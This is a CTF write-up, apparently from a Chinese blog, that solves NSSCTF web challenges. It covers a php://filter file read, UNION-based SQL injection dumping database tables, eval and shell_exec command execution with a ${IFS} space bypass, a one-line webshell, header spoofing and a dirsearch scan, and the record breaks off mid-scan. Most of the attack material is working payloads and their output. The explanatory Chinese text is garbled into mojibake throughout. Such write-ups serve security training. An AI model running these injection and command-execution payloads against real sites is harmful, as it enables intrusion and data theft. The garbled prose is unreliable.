<p>è¿™é‡Œå› ä¸ºç”¨äº†include_onceè¿™ä¸ªå‡½æ•°<br>include_onceä¼šå°è¯•åŒ…å« $file å‚æ•°æŒ‡å®šçš„æ–‡ä»¶ã€‚include_once çš„ä½œç”¨æ˜¯ç¡®ä¿åŒä¸€ä¸ªæ–‡ä»¶åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­åªè¢«åŒ…å«ä¸€æ¬¡<br>æˆ‘ä»¬åˆ©ç”¨phpä¼ªåè®®è¯»å–æ–‡ä»¶<br><code>php://filter/convert.base64-encode/source=flag.php</code><br>è¿™é‡Œæ˜¯æŒ‡å®šè¦åº”ç”¨çš„è¿‡æ»¤å™¨filteræ˜¯base64ï¼Œå°†æ–‡ä»¶é€šè¿‡base64è½¬æ¢ä¹‹åè¾“å‡ºï¼Œè¿™æ ·å­å¯ä»¥è®©phpä¸è¢«è§£ææ‰§è¡Œï¼Œåœ¨æœ‰äº›æ—¶å€™ä¹Ÿä¼šç»•è¿‡æŸäº›é™åˆ¶ã€‚è¿™ä¸ªç»å¸¸ç”¨åˆ°éœ€è¦ç†Ÿè®°ã€‚<br>å…¶ä»–çš„ä¸€äº›phpä¼ªåè®®ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STATA"><figure class="iseeu highlight /stata"><table><tr><td class="code"><pre><span class="line">1ï¼‰<span class="keyword">file</span>:<span class="comment">// è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ</span></span><br><span class="line">2ï¼‰http:<span class="comment">// è®¿é—® HTTP (S) ç½‘å€</span></span><br><span class="line">3ï¼‰ftp:<span class="comment">// è®¿é—® FTP (S) URL</span></span><br><span class="line">4) php:<span class="comment">// è®¿é—®å„ä¸ªè¾“å‡ºè¾“å…¥æµ</span></span><br><span class="line">5) zlib:<span class="comment">// å¤„ç†å‹ç¼©æµ</span></span><br><span class="line">6) data:<span class="comment">// è¯»å–æ•°æ®</span></span><br><span class="line">7) <span class="keyword">glob</span>:<span class="comment">// æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼</span></span><br><span class="line">8) phar:<span class="comment">// PHP å½’æ¡£</span></span><br><span class="line">9) rar:<span class="comment">// RAR æ•°æ®å‹ç¼©</span></span><br></pre></td></tr></table></figure></div>
<p>æœ¬é¢˜payload:<code>?file=php://filter/convert.base64-encode/source=flag.php</code><br><img src="https://pic1.imgdb.cn/item/67ae0b3ed0e0a243d4fef4b7.png"><br>å†ç”¨ä¸€ä¸ªbase64è§£ç å°±å¯ä»¥ï¼ˆå¯ä»¥ç”¨hackbarï¼Œä¹Ÿå¯ä»¥éšä¾¿æ‰¾ä¸ªè§£å¯†ç½‘ç«™ï¼‰<br><img src="https://pic1.imgdb.cn/item/67ae0b93d0e0a243d4fef4c1.png"></p>
<h1 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h1><p>å°é¢æ˜¯ä¸€å¼ æ°å“¥hhhhï¼Œç„¶åæç¤ºè¾“å…¥ç‚¹ä¸œè¥¿ï¼Œè¿™ä¸ªæ ‡ç­¾é¡µçš„æ ‡é¢˜æé†’<code>å‚æ•°æ˜¯wllm</code><br>å…ˆè¯•è¯•æœ‰æ²¡æœ‰é”™è¯¯å›æ˜¾ï¼Œå‘ç°æ˜¯æœ‰çš„</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SMALI"><figure class="iseeu highlight /smali"><table><tr><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28899/?wllm=-1&#x27;</span><br><span class="line"></span><br><span class="line">You have an error in your SQ<span class="class">L syntax;</span><span class="built_in"> check </span>the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;&#x27;-1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œæˆ‘ç›´æ¥è¾“å…¥<code>?wllm=1&#39; or 1=1 order by 1#</code>è¿˜æ˜¯è¿™ä¸ªé”™è¯¯æé†’ï¼Œè¿™æ˜¯æ˜¯å› ä¸ºç”¨#è¿™ä¸ªæ³¨é‡Šç¬¦åœ¨è¿™é¢˜ä¸é€‚ç”¨<br>åœ¨æœ¬é¢˜ä¸­ç”¨çš„æ³¨é‡Šæ˜¯<code>--+</code><br>sqlä¸­çš„æ³¨é‡Šç¬¦ï¼š<code>--</code>å•è¡Œæ³¨é‡Šç¬¦ ï¼Œ åé¢è¦åŠ ç©ºæ ¼<br>             <code>#</code>  mysqlæ³¨é‡Šç¬¦ï¼Œåªåœ¨mysqlä¸­<br>             <code>/**/</code> å¤šè¡Œæ³¨é‡Šç¬¦<br>è¿™é‡Œåœ¨<code>--</code>åé¢ç”¨<code>+</code>æ˜¯å› ä¸ºè¿™é‡Œç©ºæ ¼åœ¨urlä¸­ä¼šè¢«urlç¼–ç ï¼Œæ‰€ä»¥ç”¨<code>+</code>ä»£æ›¿ç©ºæ ¼</p>
<ol>
<li>æŸ¥å­—æ®µ</li>
</ol>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">wllm</span>=1&#x27; <span class="keyword">or</span> <span class="attribute">1</span>=1 order by 2 --+</span><br><span class="line"></span><br><span class="line">Your Login name:xxx</span><br><span class="line">Your Password:yyy</span><br><span class="line"></span><br><span class="line">?<span class="attribute">wllm</span>=1&#x27; <span class="keyword">or</span> <span class="attribute">1</span>=1 order by 4 --+</span><br><span class="line">Unknown column <span class="string">&#x27;4&#x27;</span> <span class="keyword">in</span> <span class="string">&#x27;order clause&#x27;</span></span><br></pre></td></tr></table></figure></div>
<p>è¯´æ˜ä¸€å…±æœ‰ä¸‰ä¸ªå­—æ®µ<br>2. æŸ¥å›æ˜¾</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ADA"><figure class="iseeu highlight /ada"><table><tr><td class="code"><pre><span class="line">?wllm=-<span class="number">1</span>&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment">--+</span></span><br><span class="line">Your Login name:<span class="number">2</span></span><br><span class="line">Your Password:<span class="number">3</span></span><br></pre></td></tr></table></figure></div>
<p>è¯´æ˜nameåœ¨ç¬¬äºŒåˆ— ï¼Œ passwordåœ¨ç¬¬ä¸‰åˆ—<br>3. çˆ†åº“</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">?wllm=-1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>(),<span class="number">3</span> --+</span><br><span class="line">Your Login name:test_db</span><br><span class="line">Your <span class="keyword">Password</span>:<span class="number">3</span></span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°æ•°æ®åº“å<code>test_db</code><br>4. çˆ†è¡¨</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="Q"><figure class="iseeu highlight /q"><table><tr><td class="code"><pre><span class="line">?wllm=<span class="number">-1</span>&#x27; <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">where</span> table_schema=database(); --+</span><br><span class="line"></span><br><span class="line">Your Login name:test_tb,users</span><br><span class="line">Your Password:<span class="number">3</span></span><br></pre></td></tr></table></figure></div>
<p>å¾—åˆ°è¡¨å<code>users</code> <code>test_tb</code><br><code>group_concat</code> æ˜¯ä¸€ä¸ª MySQL å†…ç½®çš„èšåˆå‡½æ•°ï¼Œå®ƒå°†æŸ¥è¯¢ç»“æœä¸­çš„å¤šä¸ªå€¼è¿æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²ã€‚<code>table_name</code> æ˜¯ <code>information_schema.tables</code> è¡¨ä¸­çš„åˆ—ï¼Œå­˜å‚¨äº†æ‰€æœ‰è¡¨çš„åå­—ã€‚<br><code>table_schema</code>ï¼šè¡¨ç¤ºæ•°æ®åº“çš„åç§°ï¼Œå³è¯¥è¡¨å±äºå“ªä¸ªæ•°æ®åº“<br>5. çˆ†å­—æ®µ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">?wllm=<span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;; --+</span></span><br><span class="line"><span class="string">Your Login name:USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password</span></span><br><span class="line"><span class="string">Your Password:3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?wllm=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(<span class="built_in">column_name</span>),<span class="number">3</span> <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=<span class="string">&#x27;test_tb&#x27;</span>; <span class="comment">--+</span></span><br><span class="line">Your <span class="keyword">Login</span> <span class="type">name</span>:id,flag</span><br><span class="line">Your <span class="keyword">Password</span>:<span class="number">3</span></span><br></pre></td></tr></table></figure></div>
<p>åœ¨<code>test_tb</code>è¿™ä¸ªæ•°æ®è¡¨é‡Œé¢æœ‰flagå­—æ®µï¼Œæ‰€ä»¥ç”¨è¿™ä¸ªæ•°æ®è¡¨</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SUBUNIT"><figure class="iseeu highlight /subunit"><table><tr><td class="code"><pre><span class="line">?wllm=<span class="string">-1</span>&#x27; union select 1,group_concat(flag),3 from test_db.test_tb; --+</span><br><span class="line">Your Login name:NSSCTF&#123;77d82ad5<span class="string">-3</span>a97<span class="string">-47</span>f0<span class="string">-9</span>c23-a4a92bc9d6f7&#125;</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œæœ€åçŸ¥é“æ˜¯ä»€ä¹ˆæ•°æ®åº“ä»€ä¹ˆè¡¨å°±å†™from <code>$database.$table</code>å°±å¯ä»¥äº† </p>
<h1 id="easyrce"><a href="#easyrce" class="headerlink" title="easyrce"></a>easyrce</h1><p>é¢˜ç›®ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>phpä¸­è¿™ä¸ªevalå‡½æ•°ä¼šæ‰§è¡Œæ‹¬å·ä¸­çš„ä¸œè¥¿ï¼Œè¿™é‡Œå°±æ˜¯æ‰§è¡Œç”¨GETè¯·æ±‚å¾—åˆ°çš„<code>url</code>å‚æ•°<br>æ‰€ä»¥å…ˆçœ‹çœ‹æœ‰ä»€ä¹ˆæ–‡ä»¶ï¼Œ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CLEAN"><figure class="iseeu highlight /clean"><table><tr><td class="code"><pre><span class="line">?url=<span class="keyword">system</span>(<span class="string">&quot;ls&quot;</span>);</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œsystemå‡½æ•°ä»£è¡¨æ‰§è¡Œç³»ç»Ÿçš„æŒ‡ä»¤ï¼Œè¿™é‡Œéœ€è¦äº†è§£ä¸€äº›åŸºç¡€çš„linuxæŒ‡ä»¤<br>ç›´æ¥ç”¨lsçœ‹å½“å‰ç›®å½•çš„æ–‡ä»¶å‘ç°æ²¡æœ‰flag,è¯´æ˜åœ¨å…¶ä»–ç›®å½•ä¸‹ï¼Œæ‰€ä»¥çœ‹çœ‹æ ¹ç›®å½•</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MAXIMA"><figure class="iseeu highlight /maxima"><table><tr><td class="code"><pre><span class="line">?url=<span class="built_in">system</span>(<span class="string">&quot;ls%20/&quot;</span>);</span><br><span class="line">bin boot dev etc flllllaaaaaaggggggg home lib lib64 media mnt opt proc root run sbin srv sys tmp usr <span class="built_in">var</span></span><br><span class="line">?url=<span class="built_in">system</span>(<span class="string">&quot;cat%20/flllllaaaaaaggggggg&quot;</span>);</span><br><span class="line">NSSCTF&#123;<span class="number">120b1080</span>-93f5-4de0-a68a-2b4748941b4b&#125;</span><br></pre></td></tr></table></figure></div>
<p>ä¸€äº›å¸¸ç”¨çš„ç³»ç»ŸæŒ‡ä»¤æ‰§è¡Œå‡½æ•°ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">system</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">passthru</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">exec</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">shell_exec</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">popen</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">proc_open</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">pcntl_exec</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure></div>
<h1 id="caidao"><a href="#caidao" class="headerlink" title="caidao"></a>caidao</h1><p>é¢˜ç›®ç»™äº†ä¸€å¼ å›¾ç‰‡ï¼Œæ˜¾ç¤ºçš„æ˜¯æ ‡å‡†çš„ä¸€å¥è¯æœ¨é©¬<br><img src="https://pic1.imgdb.cn/item/67aeb1a0d0e0a243d4ff04ca.png"><br>è¿™é‡Œçš„åé—¨å°±æ˜¯wllmï¼Œé¢˜ç›®ä¸­çš„caidaoæŒ‡çš„å°±æ˜¯ä¸­å›½èœåˆ€ï¼Œç”¨èšå‰‘æ‰“å¼€<br>æ·»åŠ æ•°æ®ï¼Œå¯†ç æ˜¯wllm<br><img src="https://pic1.imgdb.cn/item/67aeb1f6d0e0a243d4ff04ee.png"><br>æ‰“å¼€ä¹‹ååœ¨æ ¹ç›®å½•æ‰¾åˆ°flag</p>
<h1 id="Do-you-know-http"><a href="#Do-you-know-http" class="headerlink" title="Do_you_know_http"></a>Do_you_know_http</h1><p>é¢˜ç›® ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ACTIONSCRIPT"><figure class="iseeu highlight /actionscript"><table><tr><td class="code"><pre><span class="line">Please <span class="keyword">use</span> <span class="string">&#x27;WLLM&#x27;</span> browser!</span><br></pre></td></tr></table></figure></div>

<p>çœ‹ç€é¢˜ç›®çš„æ„æ€åº”è¯¥æ˜¯è¦ä¿®æ”¹httpçš„è¯·æ±‚å¤´<br>ç”¨burpsuiteæ‰“å¼€ï¼Œè¿™ä¸ªæ˜¯ä¸€ä¸ªä¸“é—¨ç”¨æ¥æŠ“åŒ…çš„å·¥å…·<br>æŠ“åˆ°åŒ…ä¹‹åå‘é€åˆ°é‡æ”¾æ¨¡å—ï¼Œå› ä¸ºæç¤ºæ˜¯<code>browser</code>æ‰€ä»¥ä¿®æ”¹<code>User-Agent: WLLM</code><br>è¿”å›ç»“æœ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">302</span> Found</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Fri, 14 Feb 2025 03:07:56 GMT</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache/2.4.25 (Debian)</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/5.6.40</span><br><span class="line"><span class="attribute">Location</span><span class="punctuation">: </span>./a.php</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>7</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line"><span class="language-ebnf"><span class="attribute">success</span></span></span><br></pre></td></tr></table></figure></div>

<p>è¿™é‡Œçš„Locationå˜äº†ï¼Œæˆ‘ä»¬å°±å»è¿™ä¸ªa.phpä¸­<br>å‡ºç°</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APPLESCRIPT"><figure class="iseeu highlight /applescript"><table><tr><td class="code"><pre><span class="line">You can only <span class="built_in">read</span> this <span class="keyword">at</span> <span class="keyword">local</span>!</span><br><span class="line">Your address112<span class="number">.49</span><span class="number">.145</span><span class="number">.11</span></span><br></pre></td></tr></table></figure></div>

<p>æ‰€ä»¥æˆ‘ä»¬è¦æ·»åŠ ä¸€ä¸ª<code>X-Forwarded-For</code>å‚æ•°<br>X-Forwarded-Forï¼ˆXFFï¼‰æ˜¯ä¸€ä¸ªHTTPè¯·æ±‚å¤´å­—æ®µï¼Œé€šå¸¸ç”¨äºæ ‡è¯†å®¢æˆ·ç«¯çš„çœŸå®IPåœ°å€ï¼Œå³ä½¿è¯·æ±‚ç»è¿‡äº†å¤šä¸ªä»£ç†æˆ–è´Ÿè½½å‡è¡¡æœåŠ¡å™¨ã€‚<br>æŠ“åˆ°è¿™ä¸ªa.phpçš„åŒ…ï¼Œç„¶ååŠ ä¸Šè¿™ä¸ªå‚æ•°ï¼Œå€¼ç”¨æœ¬åœ°çš„<code>127.0.0.1</code><br>è¿™é‡Œæˆ‘ç”¨bpå‘è¿™ä¸ªåŒ…è¿˜æ˜¯æ²¡æœ‰ç»™æˆ‘è·³è½¬<br><img src="https://pic1.imgdb.cn/item/67aeb6eed0e0a243d4ff066a.png"><br>æ‰€ä»¥ç”¨hackbarè¯•è¯•ï¼Œhackbarå¯ä»¥ç›´æ¥è·³è½¬<br><img src="https://pic1.imgdb.cn/item/67aeb722d0e0a243d4ff06a7.png"></p>
<h1 id="babyrce"><a href="#babyrce" class="headerlink" title="babyrce"></a>babyrce</h1><p>é¢˜ç›®</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;admin&#x27;</span>]==<span class="number">1</span>) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;../next.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;å°é¥¼å¹²æœ€å¥½åƒå•¦ï¼&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span> å°é¥¼å¹²æœ€å¥½åƒå•¦ï¼</span><br></pre></td></tr></table></figure></div>

<p>æ‰€ä»¥æŠŠCOOKIEä¸­çš„<code>admin</code>å€¼æ”¹æˆ1<br>hackbarä¸­ä¿®æ”¹è¯·æ±‚å¤´ï¼Œå‡ºç°<code>rasalghul.php</code><br><img src="https://pic1.imgdb.cn/item/67aec09dd0e0a243d4ff0bb3.png"><br>è®¿é—®è¿™ä¸ªphpä¹‹ååˆç»™å‡ºå¦ä¸€ä¸ªæºä»£ç </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$ip</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ /&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$a</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$ip</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿™é‡Œå°±æ˜¯è¿‡æ»¤äº†ç©ºæ ¼ï¼Œç„¶åæ‰§è¡Œurlå‚æ•°çš„å‘½ä»¤ æˆ‘ä»¬å¯ä»¥ç”¨${IFS}ç»•è¿‡<br>$IFSï¼ˆInternal Field Separatorï¼‰æ˜¯ Bash é‡Œçš„å†…éƒ¨å­—æ®µåˆ†éš”ç¬¦ï¼Œé»˜è®¤æ˜¯ç©ºæ ¼ã€‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">url</span>=ls$&#123;IFS&#125;/</span><br><span class="line">bin boot dev etc flllllaaaaaaggggggg home lib lib64 media mnt opt proc root <span class="built_in">run</span> sbin srv sys tmp usr var</span><br><span class="line"></span><br><span class="line">?<span class="attribute">url</span>=cat$&#123;IFS&#125;/flllllaaaaaaggggggg</span><br><span class="line">NSSCTF&#123;02db5dc7-82af-4e14-801c-9262db2b51f6&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="ez-unserialize"><a href="#ez-unserialize" class="headerlink" title="ez_unserialize"></a>ez_unserialize</h1><p>æ²¡æœ‰ç›´æ¥ç»™å‡ºé¢˜ç›®,æŸ¥çœ‹æºç ä¹Ÿæ²¡æœ‰ä¿¡æ¯ï¼Œæ‰€ä»¥æˆ‘å»æ‰«ä¸€ä¸‹ç›®å½•ï¼Œdirsearchå·¥å…·å¯ä»¥å»æˆ‘kaliå·¥å…·ç¬”è®°blogæŸ¥çœ‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># dirsearch -u http://node4.anna.nssctf.cn:28921/</span></span><br><span class="line"><span class="operator">/</span>usr<span class="operator">/</span>lib<span class="operator">/</span>python3<span class="operator">/</span>dist-packages<span class="operator">/</span>dirsearch<span class="operator">/</span>dirsearch.py:<span class="number">23</span>: <span class="params">DeprecationWarning:</span> pkg_resources is deprecated as an API. See https:<span class="symbol">//setuptools.pypa.io/en/latest/pkg_resources.html</span></span><br><span class="line">  from pkg_resources <span class="built_in">import</span> DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.<span class="number">4.3</span></span><br><span class="line"> (_<span class="operator">||</span>| _) (<span class="operator">/</span>_(_<span class="operator">||</span> (_| )</span><br><span class="line"></span><br><span class="line"><span class="params">Extensions:</span> php, aspx, jsp, html, js | HTTP <span class="params">method:</span> GET | <span class="params">Threads:</span> <span class="number">25</span> | Wordlist <span class="params">size:</span> <span class="number">11460</span></span><br><span class="line"></span><br><span class="line">Output <span class="params">File:</span> <span class="symbol">/root/tmp/reports/http_node4.anna.nssctf.cn_28921/__25-02-14_12-18-25.txt</span></span><br><span class="line"></span><br><span class="line"><span class="params">Target:</span> http:<span class="operator">//</span>node4.anna.nssctf.cn:<span class="number">28921</span><span class="symbol">/</span></span><br><span class="line"></span><br><span class="line">[<span class="number">12</span>:<span class="number">18</span>:<span class="number">25</span>] <span class="params">Starting:</span> </span><br><span class="line">[<span class="number">12</span>:<span class="number">18</span>:<span class="number">31</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">309</span>B  <span class="operator">-</span> <span class="symbol">/.ht_wsr.txt</span>                                      </span><br><span class="line">[<span class="number">12</span>:<span class="number">18</span>:<span class="number">31</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">312</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.bak1</span>                                   </span><br><span class="line">[<span class="number">12</span>:<span class="number">18</span>:<span class="number">31</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">314</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.sample</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">18</span>:<span class="number">31</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">312</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.orig</span>                                   </span><br><span class="line">[<span class="number">12</span>:<span class="number">18</span>:<span class="number">31</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">312</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.save</span>                                   </span><br><span class="line">[<span class="number">12</span>:<span class="number">18</span>:<span class="number">31</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">313</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_extra</span>                                  </span><br><span class="line">[<span class="number">12</span>:<span class="number">18</span>:<span class="number">31</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">310</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_sc</span>                                     </span><br><span class="line">[<span class="number">12</span>:<span class="number">18</span>:<span class="number">31</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">310</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">18</span>:<span class="number">31</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">312</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_orig</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">18</span>:<span class="number">31</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">310</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessBAK</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">18</span>:<span class="number">31</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">311</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD2</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">18</span>:<span class="number">31</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">302</span>B  <span class="operator">-</span> <span class="symbol">/.htm</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">18</span>:<span class="number">31</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">303</span>B  <span class="operator">-</span> <span class="symbol">/.html</span>                                            </span><br><span class="line">[<span class="number">12</span>:<span class="number">18</span>:<span class="number">31</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">312</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswd_test</span>                                   </span><br><span class="line">[<span class="number">12</span>:<span class="number">18</span>:<span class="number">31</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">309</span>B  <span class="operator">-</span> <span class="symbol">/.httr-oauth</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">18</span>:<span class="number">31</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">308</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswds</span></span><br><span class="line">[<span class="number">12</span>:<span class="number">18</span>:<span class="number">45</span>] <span class="number">200</span> <span class="operator">-</span>    <span class="number">0</span>B  <span class="operator">-</span> <span class="symbol">/flag.php</span>                                         </span><br><span class="line">[<span class="number">12</span>:<span class="number">18</span>:<span class="number">54</span>] <span class="number">200</span> <span class="operator">-</span>   <span class="number">35</span>B  <span class="operator">-</span> <span class="symbol">/robots.txt</span>                                       </span><br><span class="line">[<span class="number">12</span>:<span class="number">18</span>:<span class="number">55</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">312</span>B  <span class="operator">-</span> <span class="operator">/</span>server-status<span class="symbol">/</span>                                   